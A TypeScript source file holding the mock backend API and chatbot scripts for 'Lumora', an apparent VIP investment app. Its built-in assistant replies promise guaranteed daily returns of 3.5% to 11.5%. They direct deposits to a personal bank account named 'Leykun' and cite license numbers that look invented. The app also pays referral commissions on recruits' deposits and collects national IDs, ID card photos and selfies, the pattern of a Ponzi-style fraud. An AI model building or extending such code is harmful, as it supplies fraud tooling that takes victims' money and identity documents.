      message: "Congratulations! 5.00 ETB was successfully credited to your income balance as a daily login reward.",
      read: false,
      date: now.toISOString()
    });

    saveLocalDB(db);
    return respondJSON(200, { success: true, profile, bonus: bonusAmount });
  }

  // 15. POST /api/profiles/avatar
  if (pathname === '/api/profiles/avatar' && method === 'POST') {
    const { userId, avatarRaw } = body;
    const profile = db.profiles.find(p => p.userId === userId);
    if (!profile) return respondJSON(404, { error: "Profile not found" });

    profile.profilePicture = avatarRaw;
    saveLocalDB(db);
    return respondJSON(200, { success: true, profile });
  }

  // 16. POST /api/profiles/reset-verification
  if (pathname === '/api/profiles/reset-verification' && method === 'POST') {
    const { userId } = body;
    const profile = db.profiles.find(p => p.userId === userId);
    if (!profile) return respondJSON(404, { error: "Profile not found" });

    profile.idVerificationStatus = "unsubmitted";
    profile.idCardFront = "";
    profile.idCardBack = "";
    profile.idSelfie = "";
    profile.fanNumber = "";

    saveLocalDB(db);
    return respondJSON(200, { success: true, profile });
  }

  // 17. GET /api/referrals/:userId
  if (pathname.startsWith('/api/referrals/') && method === 'GET') {
    const userId = pathname.split('/').pop();
    const list = db.referrals.filter(r => r.referrerId === userId);
    const updatedList = list.map(ref => {
      const p = db.profiles.find(prof => prof.userId === ref.referredId);
      return {
        ...ref,
        referredVipLevel: p ? p.vipLevel : ref.referredVipLevel
      };
    });
    return respondJSON(200, updatedList);
  }

  // 18. POST /api/loans/submit
  if (pathname === '/api/loans/submit' && method === 'POST') {
    const { userId, amount, purpose, duration, nationalId } = body;
    const profile = db.profiles.find(p => p.userId === userId);
    if (!profile) return respondJSON(404, { error: "Profile not found" });

    if (profile.vipLevel < 3) {
      return respondJSON(400, { error: "Loan services are available only for members who have reached Level 3 or higher." });
    }

    const submittedId = nationalId || body.nationalId || "";
    const cleanId = String(submittedId).trim().replace(/[-\s]/g, '');
    if (!/^\d{16}$/.test(cleanId)) {
      return respondJSON(400, { error: "The National ID / FAN registration number must be exactly 16 digits (e.g. 8989898911899987)." });
    }

    const loan: Loan = {
      id: "loan-" + Math.random().toString(36).substr(2, 9),
      userId,
      userName: profile.fullName,
      userPhone: profile.phone,
      vipLevel: profile.vipLevel,
      amount: Number(amount),
      nationalId: submittedId || profile.fanNumber || '',
      status: "pending",
      submittedAt: new Date().toISOString(),
      tenureMonths: Math.ceil(Number(duration) / 30)
    };

    db.loans.push(loan);
    db.notifications.push({
      id: "not-" + Math.random().toString(36).substr(2, 9),
      userId,
      title: "Commercial Credit Request Recieved",
      message: `Your credit line request of ${amount} ETB has been dispatched to Lumora Underwriters. Active status audited on CBE ledger.`,
      read: false,
      date: new Date().toISOString()
    });

    saveLocalDB(db);
    return respondJSON(200, { success: true, loan });
  }

  // Admin and assistant routes are fully mocked or bypassed
  // 19. GET /api/admin/stats
  if (pathname === '/api/admin/stats' && method === 'GET') {
    const totalUsers = db.users.length;
    const totalWalletBalance = db.profiles.reduce((acc, p) => acc + p.walletBalance, 0);
    const totalApprovedDeposits = db.deposits.filter(d => d.status === 'approved').reduce((acc, d) => acc + d.amount, 0);
    const totalPendingDeposits = db.deposits.filter(d => d.status === 'pending').reduce((acc, d) => acc + d.amount, 0);
    const totalApprovedWithdrawals = db.withdrawals.filter(w => w.status === 'approved').reduce((acc, w) => acc + w.amount, 0);
    const totalPendingWithdrawals = db.withdrawals.filter(w => w.status === 'pending').reduce((acc, w) => acc + w.amount, 0);
    const totalActiveInvestments = db.investments.filter(i => i.status === 'active').reduce((acc, i) => acc + i.amount, 0);

    return respondJSON(200, {
      totalUsers,
      totalDeposited: totalApprovedDeposits,
      totalWithdrawn: totalApprovedWithdrawals,
      totalInvested: totalActiveInvestments,
      totalBalance: totalWalletBalance,
      pendingDepositsCount: db.deposits.filter(d => d.status === 'pending').length,
      pendingWithdrawalsCount: db.withdrawals.filter(w => w.status === 'pending').length,
      pendingDepositsAmount: totalPendingDeposits,
      pendingWithdrawalsAmount: totalPendingWithdrawals
    });
  }

  // 20. GET /api/admin/users
  if (pathname === '/api/admin/users' && method === 'GET') {
    const usersWithProfiles = db.users.map(u => {
      const p = db.profiles.find(pro => pro.userId === u.id);
      return { ...u, profile: p };
    });
    return respondJSON(200, usersWithProfiles);
  }

  // 21. POST /api/admin/users/status
  if (pathname === '/api/admin/users/status' && method === 'POST') {
    const targetUserId = body.targetUserId || body.userId;
    const { status } = body;
    const user = db.users.find(u => u.id === targetUserId);
    if (!user) return respondJSON(404, { error: "User not found" });

    user.status = status;
    saveLocalDB(db);
    return respondJSON(200, { success: true });
  }

  // 22. POST /api/admin/users/vip
  if (pathname === '/api/admin/users/vip' && method === 'POST') {
    const targetUserId = body.targetUserId || body.userId;
    const { vipLevel } = body;
    const profile = db.profiles.find(p => p.userId === targetUserId);
    if (!profile) return respondJSON(404, { error: "Profile not found" });

    profile.vipLevel = Number(vipLevel);
    saveLocalDB(db);
    return respondJSON(200, { success: true });
  }

  // 23. POST /api/admin/users/adjust-balance
  if (pathname === '/api/admin/users/adjust-balance' && method === 'POST') {
    const targetUserId = body.targetUserId || body.userId;
    const { amount, type } = body;
    const profile = db.profiles.find(p => p.userId === targetUserId);
    if (!profile) return respondJSON(404, { error: "Profile not found" });

    const delta = Number(amount);
    if (type === 'add') {
      profile.walletBalance += delta;
      profile.totalDeposits += delta;
      db.transactions.push({
        id: "tx-" + Math.random().toString(36).substr(2, 9),
        userId: targetUserId,
        type: 'deposit',
        amount: delta,
        description: "Institutional credit adjustment authorized by Administrator",
        date: new Date().toISOString()
      });
    } else {
      profile.walletBalance = Math.max(0, profile.walletBalance - delta);
      db.transactions.push({
        id: "tx-" + Math.random().toString(36).substr(2, 9),
        userId: targetUserId,
        type: 'withdrawal',
        amount: -delta,
        description: "Institutional debit balance adjustment authorized by Administrator",
        date: new Date().toISOString()
      });
    }

    saveLocalDB(db);
    return respondJSON(200, { success: true, profile });
  }

  // 24. POST /api/admin/users/verify-id
  if (pathname === '/api/admin/users/verify-id' && method === 'POST') {
    const targetUserId = body.targetUserId || body.userId;
    const action = body.action;
    const rejectionReason = body.rejectionReason || body.rejectionNotes;
    
    const profile = db.profiles.find(p => p.userId === targetUserId);
    if (!profile) return respondJSON(404, { error: "Profile not found" });

    const wasVerified = profile.idVerificationStatus === 'verified';
    profile.idVerificationStatus = action === 'approve' ? 'verified' : 'rejected';
    profile.idRejectionReason = action === 'reject' ? rejectionReason : '';

    let bonusGranted = false;
    if (action === 'approve' && !wasVerified && !profile.verificationBonusClaimed) {
      profile.verificationBonusClaimed = true;
      profile.walletBalance = (profile.walletBalance || 0) + 175;
      bonusGranted = true;

      // Record transaction
      db.transactions.push({
        id: "tx-" + Math.random().toString(36).substr(2, 9),
        userId: targetUserId,
        type: 'bonus',
        amount: 175,
        description: "ID Verification Reward Bonus",
        date: new Date().toISOString()
      });
    }

    db.notifications.push({
      id: "not-" + Math.random().toString(36).substr(2, 9),
      userId: targetUserId,
      title: action === 'approve' 
        ? (bonusGranted ? "Registration Identity Cleared! +175 ETB" : "Registration Identity Cleared")
        : "Identity Verification Denied",
      message: action === 'approve' 
        ? (bonusGranted 
            ? "Your credentials have cleared biometric security reviews successfully. An official signup verification bonus of 175 ETB has been credited to your wallet balance!" 
            : "Your credentials have cleared biometric security reviews successfully. Institutional state-locked investment access is now open.")
        : `Your ID submitted details failed review: "${rejectionReason}". Please re-submit clear documents.`,
      read: false,
      date: new Date().toISOString()
    });

    saveLocalDB(db);
    return respondJSON(200, { success: true });
  }

  // 25. GET /api/admin/deposits
  if (pathname === '/api/admin/deposits' && method === 'GET') {
    return respondJSON(200, db.deposits);
  }

  // 26. POST /api/admin/deposits/action
  if (pathname === '/api/admin/deposits/action' && method === 'POST') {
    const { depositId, action, rejectionReason } = body;
    const dep = db.deposits.find(d => d.id === depositId);
    if (!dep) return respondJSON(404, { error: "Deposit not found" });

    const finalStatus = action === 'approve' ? 'approved' : action === 'reject' ? 'rejected' : action;
    dep.status = finalStatus;
    dep.reviewedAt = new Date().toISOString();
    if (rejectionReason) {
      dep.rejectionReason = rejectionReason;
    }

    if (finalStatus === 'approved') {
      const profile = db.profiles.find(p => p.userId === dep.userId);
      if (profile) {
        profile.walletBalance += dep.amount;
        profile.totalDeposits += dep.amount;

        db.transactions.push({
          id: "tx-" + Math.random().toString(36).substr(2, 9),
          userId: dep.userId,
          type: "deposit",
          amount: dep.amount,
          description: `CBE Bank Deposit Approved - Ref #${depositId}`,
          date: new Date().toISOString()
        });

        // Check if referred to grant dynamic invite rewards
        const activeUser = db.users.find(u => u.id === dep.userId);
        if (activeUser && activeUser.referredBy) {
          const referee = db.users.find(u => u.referralCode === activeUser.referredBy);
          if (referee) {
            const refereeProfile = db.profiles.find(p => p.userId === referee.id);
            if (refereeProfile) {
              const bPct = db.settings ? db.settings.referralBonusPercentage : 10;
              const bonus = Number((dep.amount * (bPct / 100)).toFixed(2));
              refereeProfile.walletBalance += bonus;
              refereeProfile.totalEarnings += bonus;
              if (refereeProfile.incomeBalance === undefined) refereeProfile.incomeBalance = 0;
              refereeProfile.incomeBalance += bonus;

              // Update the reward field in the corresponding referral record
              const referralRecord = db.referrals.find(
                r => r.referrerId === referee.id && r.referredId === activeUser.id
              );
              if (referralRecord) {
                referralRecord.rewardEarned = Number((referralRecord.rewardEarned + bonus).toFixed(2));
              }

              db.transactions.push({
                id: "tx-" + Math.random().toString(36).substr(2, 9),
                userId: referee.id,
                type: "referral_reward",
                amount: bonus,
                description: `${bPct}% invite credit reward on ${activeUser.fullName} registered deposit of ${dep.amount} ETB`,
                date: new Date().toISOString()
              });

              db.notifications.push({
                id: "not-" + Math.random().toString(36).substr(2, 9),
                userId: referee.id,
                title: "Affiliate Referral Reward Posted",
                message: `You earned ${bonus} ETB affiliate commission index on your team member ${activeUser.fullName}'s CBE deposit of ${dep.amount} ETB!`,
                read: false,
                date: new Date().toISOString()
              });
            }
          }
        }
      }
    }

    saveLocalDB(db);
    return respondJSON(200, { success: true });
  }

  // 27. GET /api/admin/withdrawals
  if (pathname === '/api/admin/withdrawals' && method === 'GET') {
    return respondJSON(200, db.withdrawals);
  }

  // 28. POST /api/admin/withdrawals/action
  if (pathname === '/api/admin/withdrawals/action' && method === 'POST') {
    const { withdrawalId, action, rejectionReason } = body;
    const wit = db.withdrawals.find(w => w.id === withdrawalId);
    if (!wit) return respondJSON(404, { error: "Withdrawal not found" });

    const finalStatus = action === 'approve' ? 'approved' : action === 'reject' ? 'rejected' : action;
    wit.status = finalStatus;
    wit.reviewedAt = new Date().toISOString();
    if (rejectionReason) {
      wit.rejectionReason = rejectionReason;
    }

    if (finalStatus === 'rejected') {
      const profile = db.profiles.find(p => p.userId === wit.userId);
      if (profile) {
        profile.walletBalance += wit.amount;
        const subType = wit.balanceType || 'deposit';
        if (subType === 'income') {
          if (profile.incomeBalance === undefined) profile.incomeBalance = 0;
          profile.incomeBalance += wit.amount;
        } else {
          if (profile.depositBalance === undefined) profile.depositBalance = 0;
          profile.depositBalance += wit.amount;
        }
        profile.totalWithdrawals = Math.max(0, profile.totalWithdrawals - wit.amount);

        db.transactions.push({
          id: "tx-" + Math.random().toString(36).substr(2, 9),
          userId: wit.userId,
          type: "deposit",
          amount: wit.amount,
          description: `Refunded withdrawal cashout rejection (${subType}) - Ref #${withdrawalId}`,
          date: new Date().toISOString()
        });
      }
    }

    saveLocalDB(db);
    return respondJSON(200, { success: true });
  }

  // 29. GET /api/admin/loans
  if (pathname === '/api/admin/loans' && method === 'GET') {
    return respondJSON(200, db.loans);
  }

  // 30. POST /api/admin/loans/action
  if (pathname === '/api/admin/loans/action' && method === 'POST') {
    const { loanId, action, rejectionReason } = body;
    const loan = db.loans.find(l => l.id === loanId);
    if (!loan) return respondJSON(404, { error: "Loan not found" });

    const finalStatus = action === 'approve' ? 'approved' : action === 'reject' ? 'rejected' : action;
    loan.status = finalStatus;
    if (rejectionReason) {
      loan.rejectionReason = rejectionReason;
    }

    if (finalStatus === 'approved') {
      const profile = db.profiles.find(p => p.userId === loan.userId);
      if (profile) {
        profile.walletBalance += loan.amount;
        db.transactions.push({
          id: "tx-" + Math.random().toString(36).substr(2, 9),
          userId: loan.userId,
          type: "deposit",
          amount: loan.amount,
          description: `Lumora Approved Commercial Line-of-Credit - Ref #${loanId}`,
          date: new Date().toISOString()
        });
      }
    }

    saveLocalDB(db);
    return respondJSON(200, { success: true });
  }

  // 31. POST /api/admin/simulate-day
  if (pathname === '/api/admin/simulate-day' && method === 'POST') {
    let returnSum = 0;
    db.investments.forEach(inv => {
      if (inv.status === 'active') {
        inv.remainingDays = Math.max(0, inv.remainingDays - 1);
        inv.unclaimedReturns = (inv.unclaimedReturns ?? 0) + inv.dailyReturn;
        returnSum += inv.dailyReturn;

        const profile = db.profiles.find(p => p.userId === inv.userId);
        if (profile) {
          // Notify user
          db.notifications.push({
            id: "not-" + Math.random().toString(36).substr(2, 9),
            userId: inv.userId,
            title: "Unclaimed Returns Alert (Simulated)",
            message: `A daily simulation tick has occurred! You have an unclaimed return of ${inv.dailyReturn} ETB on your ${inv.planName} investment. Click Claim to credit to your account.`,
            read: false,
            date: new Date().toISOString()
          });
        }

        if (inv.remainingDays === 0) {
          inv.status = 'matured';
        }
      }
    });

    saveLocalDB(db);
    return respondJSON(200, { success: true, processedReturns: returnSum });
  }

  // 32. POST /api/assistant/chat
  if (pathname === '/api/assistant/chat' && method === 'POST') {
    const { userId, message } = body;
    if (!db.chatHistory[userId]) db.chatHistory[userId] = [];

    const userMsg: ChatMessage = {
      id: "msg-" + Math.random().toString(36).substr(2, 9),
      sender: 'user',
      text: message,
      date: new Date().toISOString()
    };
    db.chatHistory[userId].push(userMsg);

    const txt = message.toLowerCase();
    let reply = "Hello! I am Lumora's AI Biometrics & Finance Audit Assistant. How can I facilitate your institutional CBE clearance or VIP investment unlocks today?";
    if (txt.includes('deposit') || txt.includes('payment') || txt.includes('cbe')) {
      reply = "To submit a CBE bank deposit: Unlock your active tab 'Investments', choose a VIP level tier starting at 5000 ETB, and submit the physical bank receipt photo with the reference FAN ID. Verification processes within 2 hours.";
    } else if (txt.includes('withdraw') || txt.includes('cashout') || txt.includes('pin')) {
      reply = "Your cashout withdrawals are dispatched to the Commercial Bank of Ethiopia (CBE) hourly. To submit, configure your bank destination coordinates and type your secure 4-digit security PIN.";
    } else if (txt.includes('interest') || txt.includes('earn') || txt.includes('profit')) {
      reply = "Accrued interest on all Lumora VIP levels yields from 5.6% up to 11.5% daily. All earnings are state-protected, guaranteed, and directly available for withdrawal.";
    } else if (txt.includes('security') || txt.includes('safe') || txt.includes('biometric') || txt.includes('selfie')) {
      reply = "Lumora uses cutting-edge biometric facial verification and 68-point pupil matrix analysis to secure state compliance and guard customer assets against spoofing.";
    }

    const botMsg: ChatMessage = {
      id: "msg-" + Math.random().toString(36).substr(2, 9),
      sender: 'assistant',
      text: reply,
      date: new Date().toISOString()
    };
    db.chatHistory[userId].push(botMsg);

    saveLocalDB(db);
    return respondJSON(200, { reply: botMsg.text, history: db.chatHistory[userId] });
  }

  // 33. GET /api/assistant/chat/:userId
  if (pathname.startsWith('/api/assistant/chat/') && method === 'GET') {
    const userId = pathname.split('/').pop() || '';
    const history = db.chatHistory[userId] || [];
    return respondJSON(200, history);
  }

  // 34. POST /api/assistant/chat/clear
  if (pathname === '/api/assistant/chat/clear' && method === 'POST') {
    const { userId } = body;
    db.chatHistory[userId] = [];
    saveLocalDB(db);
    return respondJSON(200, { success: true });
  }

  // 34b. POST /api/support/ai (Local fallback chatbot of Lumora Knowledge Base)
  if (pathname === '/api/support/ai' && method === 'POST') {
    const { message } = body;
    const txt = (message || "").toLowerCase();
    
    let reply = "Hello! I am your Lumora AI Assistant. How can I help you with our VIP investment plans, CBE deposits, or withdrawals today?";
    
    if (txt.includes('deposit') || txt.includes('payment') || txt.includes('cbe') || txt.includes('transfer')) {
      reply = "To deposit funds into Lumora:\n\n1. Go to the Home tab and click **DEPOSIT**, or select a VIP Plan first.\n2. Transfer the desired amount to our official CBE Account:\n   • **Bank**: Commercial Bank of Ethiopia (CBE)\n   • **Account Name**: Leykun\n   • **Account Number**: `1000419524747`\n3. Click 'I have paid', upload your transaction/receipt screenshot, and submit.\n4. Verification usually takes 0 to 42 hours (average is under 2 hours).";
    } else if (txt.includes('withdraw') || txt.includes('cashout') || txt.includes('minimum withdrawal')) {
      reply = "Lumora Withdrawal Rules:\n\n• **Minimum Withdrawal**: 600 ETB\n• **Fee**: 10% fee for Income Pool withdrawals (5% Tax + 5% Handling), 5% handling fee for Deposit Pool withdrawals.\n• **Payout Speed**: Requests are processed and dispatched within 0 to 42 hours.\n• Ensure you have configured your CBE account details and typed your secure 4-digit PIN in your Profile tab.";
    } else if (txt.includes('plan') || txt.includes('vip') || txt.includes('interest') || txt.includes('rate') || txt.includes('return')) {
      reply = "Lumora offers 15 premium VIP Levels for investment:\n\n" +
              "• **VIP 1**: Invest 5,000 ETB, earn **3.50% daily** (total ~13,750 ETB, 50 days)\n" +
              "• **VIP 2**: Invest 10,000 ETB, earn **3.75% daily** (total ~28,750 ETB, 50 days)\n" +
              "• **VIP 3**: Invest 25,000 ETB, earn **4.00% daily** (total ~75,000 ETB, 50 days)\n" +
              "• **VIP 4**: Invest 50,000 ETB, earn **4.30% daily** (total ~157,500 ETB, 50 days)\n" +
              "• **VIP 5**: Invest 100,000 ETB, earn **4.60% daily** (total ~422,000 ETB, 70 days)\n" +
              "• Refer to the **PLANS** tab for higher levels (VIP 6 to VIP 15) returning up to 10.00% daily returns.";
    } else if (txt.includes('pool') || txt.includes('income pool') || txt.includes('deposit pool') || txt.includes('wallet balance')) {
      reply = "Lumora operates two distinct balance pools:\n\n" +
              "1. **Deposit Pool**: Tracks your direct deposits, used primarily to purchase VIP plans.\n" +
              "2. **Income Pool**: Tracks your active passive earnings, compound yields, and referral bonuses. Daily earnings are credited directly to your Income Pool every 24 hours.\n\nWithdrawals can be made from either pool, subject to transaction rules.";
    } else if (txt.includes('loan') || txt.includes('sovereign')) {
      reply = "Members reaching **VIP Level 3** or higher with a fully verified **National ID** are eligible to apply for low-interest Sovereign Loans up to 200,000 ETB directly from the profile workspace.";
    } else if (txt.includes('refer') || txt.includes('invite') || txt.includes('bonus') || txt.includes('commission')) {
      reply = "Earn lucrative rewards by building your team!\n\n• Get a **10% direct VIP level incentive** on deposit amounts from invited users.\n• Bonus rewards are credited directly into your Income Pool instantly.";
    } else if (txt.includes('license') || txt.includes('regulation') || txt.includes('safe') || txt.includes('legit')) {
      reply = "Lumora is registered and fully certified under FDRE Trade, Industry & Investment ministry standards:\n\n• **Trade Registration No**: LUM-ETH/77402-2B\n• **Investment License No**: LIC-984/CBE/2026\n• **Audited SEC Ledger**: ETB-FTS-88402-SEC\n• Incorporates secure 3D-facial biometrics and CBE online ledger verification.";
    } else if (txt.includes('how to invest') || txt.includes('how can i invest') || txt.includes('investing')) {
      reply = "How to Invest in Lumora:\n\n1. Go to the **PLANS** or **HOME** tab.\n2. Select a VIP level plan matching your capital.\n3. Make sure to choose **at least 1 and up to 5 projects** (e.g. Cryptocurrency, Gold, Real Estate) to allocate your capital (this is a mandatory step).\n4. Click 'Confirm VIP Activation'. If your Deposit Balance is insufficient, you can pay via local CBE transfer and submit your transaction receipt.";
    }

    return respondJSON(200, { text: reply });
  }

  // 35. POST /api/admin/broadcast
  if (pathname === '/api/admin/broadcast' && method === 'POST') {
    const { title, message } = body;
    db.users.forEach(u => {
      db.notifications.push({
        id: "not-" + Math.random().toString(36).substr(2, 9),
        userId: u.id,
        title,
        message,
        read: false,
        date: new Date().toISOString()
      });
    });
    saveLocalDB(db);
    return respondJSON(200, { success: true });
  }

  // 36. POST /api/admin/settings/edit
  if (pathname === '/api/admin/settings/edit' && method === 'POST') {
    db.settings = { ...db.settings, ...body };
    saveLocalDB(db);
    return respondJSON(200, { success: true, settings: db.settings });
  }

  // 37. GET /api/admin/settings
  if (pathname === '/api/admin/settings' && method === 'GET') {
    return respondJSON(200, db.settings || DEFAULT_SETTINGS);
  }

  // 38. GET /api/investments/:userId
  if (pathname.startsWith('/api/investments/') && method === 'GET') {
    const userId = pathname.split('/').pop();
    const list = db.investments.filter(i => i.userId === userId);
    return respondJSON(200, list);
  }

  // 39. POST /api/notifications/read or /api/notifications/read-all
  if ((pathname === '/api/notifications/read' || pathname === '/api/notifications/read-all') && method === 'POST') {
    const { userId } = body;
    db.notifications.forEach(n => {
      if (n.userId === userId) {
        n.read = true;
      }
    });
    saveLocalDB(db);
    return respondJSON(200, { success: true });
  }

  // Default catch-all 404 response
  return respondJSON(404, { error: `Endpoint '${pathname}' not implemented.` });
}

// Global window interceptor initialization
let fallbackToLocalDB = false;

// Auto-activate offline/static fallback if on Vercel or similar static hosts
if (typeof window !== "undefined") {
  const host = window.location.hostname;
  if (host.endsWith("vercel.app") || host.endsWith("github.io") || host.includes("stackblitz") || host.includes("codesandbox")) {
    console.log("Static host hosting environment detected. Initializing client-only storage module.");
    fallbackToLocalDB = true;
  }
}

if (typeof window !== "undefined") {
  const originalFetch = window.fetch;
  
  const customFetch = async function (this: any, input: RequestInfo | URL, init?: RequestInit): Promise<Response> {
    const url = typeof input === 'string' 
      ? input 
      : (input instanceof Request ? input.url : String(input));
    
    if (url.startsWith('/api/') || url.includes('/api/')) {
      if (fallbackToLocalDB) {
        return handleLocalAPI(url, init);
      }
      
      try {
        const response = await originalFetch(input, init);
        const contentType = response.headers.get('content-type') || '';
        
        // If the URL ends up resolving to HTML, the server is doing SPA routes wildcard (or Vercel 404 index.html)
        if (response.status === 404 || contentType.includes('text/html')) {
          console.warn(`API path (${url}) returned static HTML or 404. Falling back to Client-Side LocalStorage for this request.`);
          return handleLocalAPI(url, init);
        }
        
        return response;
      } catch (err) {
        console.warn(`API request (${url}) failed with network exception. Falling back to Client-Side LocalStorage for this request.`, err);
        return handleLocalAPI(url, init);
      }
    }
    
    return originalFetch(input, init);
  };

  try {
    Object.defineProperty(window, 'fetch', {
      value: customFetch,
      configurable: true,
      writable: true,
      enumerable: true
    });
  } catch (err) {
    console.warn("Could not override window.fetch with Object.defineProperty, trying direct assignment:", err);
    try {
      (window as any).fetch = customFetch;
    } catch (err2) {
      console.error("All fetch override strategies failed", err2);
    }
  }
}
